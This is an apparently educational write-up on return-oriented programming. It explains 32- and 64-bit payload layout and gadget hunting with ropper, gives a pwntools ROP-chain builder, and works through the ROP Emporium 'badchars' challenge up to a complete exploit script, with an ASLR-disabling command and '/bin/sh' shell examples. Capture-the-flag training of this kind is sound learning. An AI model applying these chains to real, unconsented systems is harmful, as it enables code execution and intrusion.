ROP B1n-3xp
### Part1 : Basics of Writing a ROP chain!
- [x] Not Yet Completed#  Under Construction!!!! 

##### To Disable Address Space Layout Randomization

```bash
echo "0" >  /proc/sys/kernel/randomize_va_space
```

# **The Stack Difference Between 32 and 64 bit binary**

##  x86_32

```
+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+----------+---------+------+------+
|  %eax   | %ebx | %ecx | %edx | %esi | %edi | %ebp |
+---------+------+------+------+------+------+------+
```


*The way to exploit a 32bit binary is like reading a letter from a friend that's sent through post :
• First you will see a from address i.e the address from where the letter started it's journey (system_address)
• Second you will see a to address i.e the address to where the letter ends its journey (return address)
• Finally you will be able to see the contents of the letter i.e which is the context of the letter (arguments for the system_address)*

**Thus, the 32bit version payload would be…**

~~~
PAYLOAD = offset_padding + system_addr + "4_byte_junk" + print_flag
~~~


## x86_64
```
+---------+-------+-------+------+------+------+------+
| syscall |  arg0 |  arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+-------+-------+------+------+------+------+
|   %rax  | %rdi  |  %rsi | %rdx | %r10 |  %r8 | %r9  |
+---------+-------+-------+------+------+------+------+
```



*The way to exploit a 64bit binary is like reading a letter which is empty on the outside:
• First ,you have to open the letter without damaging it to know what is inside (rop gadgets)
• Second, you will be able to see the contents of the letter i.e the context of the letter (arguments for the system_address)
• Finally after reading the letter you will be able to know who wrote the letter i.e the from address (system_address)*

**The 64bit version payload would be…**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PAYLOAD =  offset_padding + pop_rdi_gadget + print_flag + system_address
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## **Writing in the Stack and executing  ROP (Return Oriented Programming) to pwn a binary**

◇ Find a place to write by checking for Writeable and Allocatable (WA) memory with enough space! 
~~~bash
readelf -S binary #[mem_address]
~~~
◇ Search for the appropriate mov gadget to inject the string into the stack by 
~~~bash
ropper --file binary --search "mov" #[mov_address]
~~~
◇ Search for the appropriate pop gadget to inject the string into the stack by 
~~~bash
ropper --file binary --search "pop" #[pop_address]
~~~

- ***Writing into the Stack in a 32bit binary***
	> For example if we are going to write the string “/bin/sh” into the stack. Given that we can only write 4 words at a time into the stack or else we may overwrite the other registers in the process.`
 
	- Writing “/bin” in the stack 
		- pop_address to clear the registers and then move to the mem_address and then write/overwrite it with “/bin” and then move back to EIP using mov_address , so that we can write the next part of string inside the memory
	~~~
	rop1 = pop_address + mem_address + “/bin” + mov_address
	~~~

	- Writing “//sh” or “/sh/x00”
		- pop_address to clear the registers and then move to the (mem_address+4)[The plus 4 is because the first 4 elements of the memory is already filled by rop1 ] and then write/overwrite it with “/sh” and then move back to EIP using mov_address , so that we can do a sys_call and call “/bin/sh”

	~~~
	rop2 = pop_address + (mem_address+4) + “/sh\x00” + mov_address
	~~~


- **Writing the Final Payload after writing “/bin/sh” into the stack**

~~~
PAYLOAD = offset_padding + rop1 + rop2 + system_address + *4_byte_junk* + mem_address
~~~
> We can also use print function and flag_name.txt as argument to cat the flag... rather than getting a shell. If a print function is given in the binary

- ***Writing into the Stack in a 64bit binary***

	> I didnt wanna take the same example here as “/bin/sh” because it takes only 8bytes so we can complete the rop in a single line given that in 64bit we can write 8 words at a time into the stack as a threshold so to make it more interesting , i am writing the string “/bin/cat *.txt” into the stack.`
 
	- Writing “/bin/cat” in the stack 
		- pop_address to clear the registers and then move to the mem_address and then write/overwrite it with “/bin/cat” and then move back to RIP using mov_address , so that we can write the next part of string inside the memory

	~~~
	rop1 = pop_address + mem_address + “/bin/cat” + mov_address
	~~~
	- Writing “ \*.txt” [Adding a space in the front as only “/bin/cat \*.txt” works and “/bin/cat \*.txt" doesnt]
		- pop_address to clear the registers and then move to the (mem_address+8)[The plus 8 is because the first 8 elements of the memory is already filled by rop1 ] and then write/overwrite it with “ \*.txt\x00\x00” and then move back to RIP using mov_address , so that we can do a sys_call and call “/bin/cat \*.txt”
	~~~
	rop2 = pop_address + (mem_address+8) + “ *.txt\x00\x00” + mov_address
	~~~

- Writing the Final Payload after writing “/bin/cat \*.txt” into the stack
`As it is a 64bit binary we need a pop_rdi gadget to pop RDI and create a fake stack to control the flow of execution, which can be selected from here `
~~~bash
ropper --file binary --search "pop rdi" #[pop_rdi]
~~~
~~~
PAYLOAD = offset_padding + rop1 + rop2 + pop_rdi + mem_address + sys_address
~~~


> But I am too lazy to make a ROP chain and then append it with the PAYLOAD.....,So i automated the process to create the ropchain,not the finest program,But it WORKS at 	somecases!!!, i am working on to find why the below program fails in some binary and works on other

~~~python
from pwn import * #[pip2 install pwntools] because, I personally feel python2 is great for pwning binary

def ropper(mem_addr,pop_addr,mov_addr,sys_addr,string,arch = 32):
# Functionable for both 32 and 64 bit
#IMPORTANT : CHOOSE THE correct address for the rop chain to work
# Format of pop_addr,mov_addr and sys_addr - only packed as 32bit
# Format of mem_addr - as int or hex_int
# Format of string - only str
# Format of Arch - only int
	i = 0
	rop = ""
	if arch == 64:
		s = [string[j:j+8] for j in range(0,len(string),8)]
		for a in s:
			if len(a) % 8 != 0:
				a += "\x00"*(8 - len(a))
			rop += pop_addr + p64(mem_addr+i) + a + mov_addr
			i += 8
	else:
		s = [string[j:j+4] for j in range(0,len(string),4)]
		for a in s:
			if len(a) % 4 != 0:
				a += "\x00"*(4 - len(a))
			rop += pop_addr + p32(mem_addr+i) + a + mov_addr
			i += 4
	return rop
~~~

## Part2 : Dealing With Bad Chars

### Dealing with Bad Characters while writing rop

> Bad Characters are a set of ascii that are unknown to binary , so it interprets the bad characters as someother character , which can break whole exploit.
- If our exploit goes wrong , eventhough when our way of exploiting the binary is right , we should debug the binary to check for bad characters.
- I guess an example would be a great idea to explain on how to deal with the badcharacters!
- I chose a challenge named “badchars(86x_32)” from Rop Emporium , https://ropemporium.com/challenge/badchars.html

**On Running the Binary , it says**

~~~
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> 
~~~

- So , binary gave it's badchars... which just made my life easier,lets debug it to find some interesting functions inside the binary

~~~gdb
gef➤  info func
All defined functions:

Non-debugging symbols:
0x0804837c  _init 
0x080483b0  pwnme@plt $#%
0x080483c0  __libc_start_main@plt
0x080483d0  print_file@plt
0x080483e0  __gmon_start__@plt
0x080483f0  _start
0x08048430  _dl_relocate_static_pie
0x08048440  __x86.get_pc_thunk.bx
0x08048450  deregister_tm_clones
0x08048490  register_tm_clones
0x080484d0  __do_global_dtors_aux
0x08048500  frame_dummy
0x08048506  main $#%
0x0804852a  usefulFunction $#%
0x08048543  usefulGadgets $#%
0x08048560  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c4  _fini
~~~
- I marked the interesting functions with *$#%* symbol
~~~gdb
gef➤  disas pwnme
Dump of assembler code for function pwnme@plt:
   0x080483b0 <+0>:     jmp    DWORD PTR ds:0x804a00c
   0x080483b6 <+6>:     push   0x0
   0x080483bb <+11>:    jmp    0x80483a0
End of assembler dump.
~~~
- There are no useful functions or instructions in pwnme() , it has a 2 jump function and it pushes 0x0 into the stack , which is totally normal
~~~gdb
gef➤  disas main
Dump of assembler code for function main:
   0x08048506 <+0>:     lea    ecx,[esp+0x4]
   0x0804850a <+4>:     and    esp,0xfffffff0
   0x0804850d <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048510 <+10>:    push   ebp
   0x08048511 <+11>:    mov    ebp,esp
   0x08048513 <+13>:    push   ecx
   0x08048514 <+14>:    sub    esp,0x4
   0x08048517 <+17>:    call   0x80483b0 <pwnme@plt>
   0x0804851c <+22>:    mov    eax,0x0
   0x08048521 <+27>:    add    esp,0x4
   0x08048524 <+30>:    pop    ecx
   0x08048525 <+31>:    pop    ebp
   0x08048526 <+32>:    lea    esp,[ecx-0x4]
   0x08048529 <+35>:    ret    
End of assembler dump.
~~~
- I could safely say that , the main function is making a call to pwnme function, still i dont see something suspicious or useful
~~~gdb
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804852a <+0>:     push   ebp
   0x0804852b <+1>:     mov    ebp,esp
   0x0804852d <+3>:     sub    esp,0x8
   0x08048530 <+6>:     sub    esp,0xc
   0x08048533 <+9>:     push   0x80485e0
   0x08048538 <+14>:    call   0x80483d0 <print_file@plt>
   0x0804853d <+19>:    add    esp,0x10
   0x08048540 <+22>:    nop
   0x08048541 <+23>:    leave  
   0x08048542 <+24>:    ret    
End of assembler dump.
~~~
- Ah!.We get to see a print_file() which can read a file which is given as it's argument, hence `prt_add = 0x80483d0`
- The only file we want to read is flag.txt ,aah! ,going back to the badchars ['a','g','x','.'] ,we can understand only the words ['f','l',t] can be used....., you may think , we can use the string as /bin/sh to get a shell and also it has no badchars , but , we dont have a system() or execve() [I am not talking about the address we get from `p system` in GDB , its a temporary address that is created in runtime,so it respectively changes from OS to OS we are using and it also changes if ASLR is enabled which may or may not cause errors, in simple words it's a loose end]
~~~gdb
gef➤  disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>:     add    BYTE PTR [ebp+0x0],bl
   0x08048546 <+3>:     ret    
   0x08048547 <+4>:     xor    BYTE PTR [ebp+0x0],bl
   0x0804854a <+7>:     ret    
   0x0804854b <+8>:     sub    BYTE PTR [ebp+0x0],bl
   0x0804854e <+11>:    ret    
   0x0804854f <+12>:    mov    DWORD PTR [edi],esi
   0x08048551 <+14>:    ret    
   0x08048552 <+15>:    xchg   ax,ax
   0x08048554 <+17>:    xchg   ax,ax
   0x08048556 <+19>:    xchg   ax,ax
   0x08048558 <+21>:    xchg   ax,ax
   0x0804855a <+23>:    xchg   ax,ax
   0x0804855c <+25>:    xchg   ax,ax
   0x0804855e <+27>:    xchg   ax,ax
End of assembler dump.
~~~
- We are given 3 gadgets to make our ropchain [add,xor and sub] , we are going to use only 1 gadget.

# *Devising a Solution*
1. Finding the offset of the binary to trigger a buffer overflow.
	~~~gdb
	gef➤  pattern create 50
	[+] Generating a pattern of 50 bytes
	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
	~~~
	- Sadly we have too many "a" and "f" , which are the badchars , so we can't check the offset correctly.
	- Time to make our own payload , i use msf to create a payload without bad characters.
	~~~bash
	msf-pattern_create -l 50 -s ABC,123,DEF
	A1DA1EA1FA2DA2EA2FA3DA3EA3FB1DB1EB1FB2DB2EB2FB3DB3
	~~~
	- On giving the input , we successfully overwrite EIP and cause a segfault.
	~~~gdb
	[#0] Id 1, Name: "1", stopped 0x44334246 in ?? (), reason: SIGSEGV
	~~~
	- We have finalized that the offset is **44** after checking EIP address with msf
	~~~bash
	msf-pattern_offset -l 50 -s ABC,123,DEF -q 0x44334246
	[*] Exact match at offset 44
	~~~
2. Next , We have to find a address to write our string , but the string should not contain any bad characters , so we should use 1 of the gadget operation to encode the string and then write it into the stack and then decode it using the gadget to get the original string.
	- ###### Finding a Writable Memory
		~~~bash
		readelf -S <binary_name> | grep "WA" # WA - Writable and Allocatable
  		[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
	  	[19] .init_array       INIT_ARRAY      08049efc 000efc 000004 04  WA  0   0  4
	  	[20] .fini_array       FINI_ARRAY      08049f00 000f00 000004 04  WA  0   0  4
  		[21] .dynamic          DYNAMIC         08049f04 000f04 0000f8 08  WA  6   0  4
  		[22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
		[23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  		[24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  		[25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
		~~~
		- .data and .bss looks fine to write the memory as these to have enough size to write and i am rejecting others because it may have filled with libc address , which we doesnt want to touch.
		- I will write my string in .data , hence `mem_add = 0x0804a018`
	- ###### Selecting a Gadget operation and performing it on 
		- I chose XOR gadget , so I must encode the string in xor , but with what???? , hence `xor_add = p32(0x08048547)`
		~~~gdb
		0x08048547 <+4>:     xor    BYTE PTR [ebp+0x0],bl
		~~~
		- As the XOR instruction says , the XOR is done bitwise between , **ebp** and **bl** , So we need a gadget that contains **pop ebp** and we have to know what is the value of **bl**, but i got some random value when i checked the value **bl** ,i will use the classic pattern `['A'\*44 + 'junk']` to check the value of **bl**
		~~~gdb
		gef➤  p $bl
		$4 = 0x41
		~~~
		- We got the the **bl** value as 0x41 , which is "A" in ASCII , so the some byte in the first 44 bytes of "A" controls the **bl** , we dont wanna spend time in finding which specific byte controls **bl** and i think it's unnecessary at this case
		- XORing `flag.txt` with `0x41` using pycryptodome
		~~~python
		from Crypto.Util.strxor_c import strxor
		e = strxor_c(b"flag.txt",0x41) # '- &o595
		print(e)
		~~~
	- ###### Writing the encoded string inside memory [.data]
		- First We need a pop address to empty the registers so that we can fillup out data inside it and control it to do what we want to do 
			- ROPPER will help us to find the ROP gadgets without any bad character with the flag `-b`
			~~~bash
			ropper --file 1 -b 7867612e --search "pop"
			[INFO] Load gadgets from cache
			[LOAD] loading... 100%
			[LOAD] filtering badbytes... 100%
			[LOAD] removing double gadgets... 100%
			[INFO] Searching for gadgets: pop
			[INFO] File: 1
			0x08048525: pop ebp; lea esp, dword ptr [ecx - 4]; ret; 
			0x080485bb: pop ebp; ret; 
			0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret; 
			0x0804839d: pop ebx; ret; 
			0x08048524: pop ecx; pop ebp; lea esp, dword ptr [ecx - 4]; ret; 
			0x080485ba: pop edi; pop ebp; ret; 
			0x080485b9: pop esi; pop edi; pop ebp; ret; $#%
			0x08048527: popal; cld; ret; 
			~~~
			- I marked the gadget that is useful as *$#%* , i selected that specific gadget because registers like **ESI** and **EDI** are best to write and here the only gadget that starts with **pop esi; pop edi;** is `0x080485b9`, still we have **pop ebp** at the end , which is a problem as it is excess space to write , so we will be filling it with junk!
		- Second , we need a mov address to move the string into a specific memory [.data].
			- With the help of ropper i am searching for `mov dword` as we are injecting data as a 4byte string not as a single character.
			~~~bash
			ropper --file 1 -b 7867612e --search "mov dword"
			[INFO] Load gadgets from cache
			[LOAD] loading... 100%
			[LOAD] filtering badbytes... 100%
			[LOAD] removing double gadgets... 100%
			[INFO] Searching for gadgets: mov dword
			[INFO] File: 1
			0x0804854f: mov dword ptr [edi], esi; ret; 
			~~~
			- That was fast and it matches the pop address registers perfectly,hence `mov_add = p32(0x0804854f)`
		- Constructing a Payload to write the memory into the stack with the gathered information
			- As we can see the mov address instruction says that the string is moved from **ESI** to **EDI** , so **ESI** is the place where we keep the encoded string.
		```python
		from pwn import *
		from Crypto.Util.strxor import strxor_c

		mem_add = 0x0804a018            #.data
		e = strxor_c(b"flag.txt",0x41)  #bl = 0x41
		xor_add = p32(0x08048547)       #xor  BYTE PTR [ebp+0x0],bl
		pop_add = p32(0x080485b9)      #pop esi; pop edi; pop ebp; ret;
		mov_add = p32(0x0804854f) 		#mov dword ptr [edi], esi; ret; 
		
		payload = 'A'*44 # offset
		
		# Sending the first 4bytes of encoded string
		payload += pop_add # Clearing the registers to create a fake stack
		payload += e[:4] #Sending the encoded bytes as this is stored as ESI as per mov gadget instruction and also it's a 32 bit binary so , only 4 bytes can be written at a time , 1st Instruction is done i.e [pop esi;]
		payload += p32(mem_add) # 2nd Instruction is done i.e [pop edi;]
		payload += "AAAA" # 3rd Instruction is done i.e [pop ebp; ret], as i dont want mov_add to be in EBP as i have no use if i filled EPB with mov gadget address , it doesnt execute anything, so i am filling it with junk!
		payload += mov_add 
		
		# Sending the next 4bytes of encoded string
		payload += pop_add
		payload += e[4:] #1st Instruction is done i.e [pop esi;]
		payload += p32(mem_add+4) #The plus 4 is because we have already written the first 4 bytes into .data , 2nd Instruction is done i.e [pop edi;]
		payload += "AAAA" #3rd Instruction is done i.e [pop ebp; ret]
		payload += mov_add
		```
		- Using the payload in GDB and checking if we have written our encode string in .data address
		~~~bash
		gef➤  x/s 0x0804a018
		0x804a018:      "'- &o595"
		~~~
		- Yahhhhh! , We have successfully written out our encoded string inside .data memory
	
	- ###### Decoding the encoded string inside memory [.data]
		- Decoding the string is kinda tedious , as we have to do it bitwise for every single char in the string in .data , but why fear when python is here!
		- Now we need a pop gadget to write into **EBP** , but why **EBP** ??? because the XOR gadget we chose `BYTE PTR [ebp+0x0],bl` does XOR between value in **EBP** and **bl** ,we know that the value of **bl = 0x41** , so now we have 2 choices.
			1. We either use old pop gadget as it contains **ebp** as it's last instruction before ret `pop esi; pop edi; pop ebp; ret;` by filling junk inside **ESI** and **EDI** and then filling **EBP** with the memory address for every byte to XOR it
			2. Or , We can find another pop gadget using ropper and use it to write into the binary 
			~~~bash
			ropper --file 1 -b 7867612e --search "pop ebp"
			[INFO] Load gadgets from cache
			[LOAD] loading... 100%
			[LOAD] filtering badbytes... 100%
			[LOAD] removing double gadgets... 100%
			[INFO] Searching for gadgets: pop ebp
			[INFO] File: 1
			0x08048525: pop ebp; lea esp, dword ptr [ecx - 4]; ret; 
			0x080485bb: pop ebp; ret; 
			~~~
			The last gadget `0x080485bb: pop ebp; ret;` is perfect , we can use this pop address also to write into **EBP**
		- But i am going with the 1st choice , as i dont want to make the solution complex by introducing a new pop gadget
		~~~python
		mem_add = 0x0804a018            #.data
		e = strxor_c(b"flag.txt",0x41)  #bl = 0x41
		xor_add = p32(0x08048547)       #xor  BYTE PTR [ebp+0x0],bl
		pop_add = p32(0x080485b9)       #pop esi; pop edi; pop ebp; ret;
		mov_add = p32(0x0804854f) 	#mov dword ptr [edi], esi; ret; 
		prt_add = p32(0x80483d0)
		payload = 'A'*44 # offset
		payload += pop_add + e[:4] + p32(mem_add) + "AAAA" + mov_add 
		payload += pop_add + e[4:] + p32(mem_add+4) + "AAAA" + mov_add 
		
		# PAYLOAD for XORing the string starts from here
		payload += pop_add  		# Clearing the Stack
		payload += "AAAA" 		# Filling ESI with junk as it is not useful in this case
		payload += "AAAA" 		# Filling EDI with junk as it is not useful in this case
		payload += p32(mem_add)		# Filling EBP with memory address so that the XORing operation takes place between 0x41 (bl) and first character inside .data, we have increase the memory address by one until all of the string is xored , in this case the length of string is 8 , so we have to 7 more times to change all the bytes of the string inside .data
		payload += xor_add 		#XOR Operation takes place in .data
		
		print(payload)
		~~~
		- Let us check if the first byte of .data is decoded using the payload we generated and by debugging it in GDB
		~~~
		gef➤  x/s 0x0804a018
		0x804a018:      "f- &o595"
		~~~
		- Hurray!, We have got the first bytes as **f** after XORing!, Now we can automate the process of xoring using
		```python
		from pwn import *
		from Crypto.Util.strxor import strxor_c
		mem_add = 0x0804a018            #.data
		e = strxor_c(b"flag.txt",0x41)  #bl = 0x41
		xor_add = p32(0x08048547)       #xor  BYTE PTR [ebp+0x0],bl
		pop_add = p32(0x080485b9)       #pop esi; pop edi; pop ebp; ret;
		mov_add = p32(0x0804854f) 	#mov dword ptr [edi], esi; ret; 
		prt_add = p32(0x80483d0)
		payload = 'A'*44 # offset
		payload += pop_add + e[:4] + p32(mem_add) + "AAAA" + mov_add 
		payload += pop_add + e[4:] + p32(mem_add+4) + "AAAA" + mov_add
		for i in range(len(e)):
			payload += pop_add + "AAAA" + "AAAA" + p32(mem_add+i) + xor_add
		```
		- Now we should have decoded all the strings as **flag.txt** , we are good to write the final payload to call the **print_file()** function and give memory address as an argument so that we can open **flag.txt**
	- ###### Final Payload
		- The desired function we have to call to read the flag.txt is print_file() function
		~~~python
		....SNIPPED.....
		prt_add = 0x80483d0
		payload += prt_add # Calling print_file()
		payload += "AAAA"  # Adding Junk because when a function is called , first 4 bytes after calling function fills into EBP and then it fill the argument(s)
		payload += p32(mem_add) # Giving the memory address as an argument to opent the flag.txt
		....SNIPPED.....
		~~~
		- So the Final Payload after adding some pwntools magic looks something like this
		~~~python
		from pwn import *
		from Crypto.Util.strxor import strxor_c

		elf = ELF("binary_name")
		r = elf.process()
		r.recvuntil("> ")

		mem_add = 0x0804a018            #.data
		e = strxor_c(b"flag.txt",0x41)  #bl = 0x41
		xor_add = p32(0x08048547)       #xor  BYTE PTR [ebp+0x0],bl
		pop_add = p32(0x080485b9)       #pop esi; pop edi; pop ebp; ret;
		mov_add = p32(0x0804854f) 	#mov dword ptr [edi], esi; ret; 
		prt_add = p32(0x80483d0)	#0x80483d0 <print_file@plt>

		payload = 'A'*44 # offset

		payload += pop_add + e[:4] + p32(mem_add) + "AAAA" + mov_add 
		payload += pop_add + e[4:] + p32(mem_add+4) + "AAAA" + mov_add

		for i in range(len(e)):
			payload += pop_add + "AAAA" + "AAAA" + p32(mem_add+i) + xor_add
			
		payload += prt_add + "AAAA" + p32(mem_add)
		
		r.sendline(payload)
		r.interactive()
		~~~
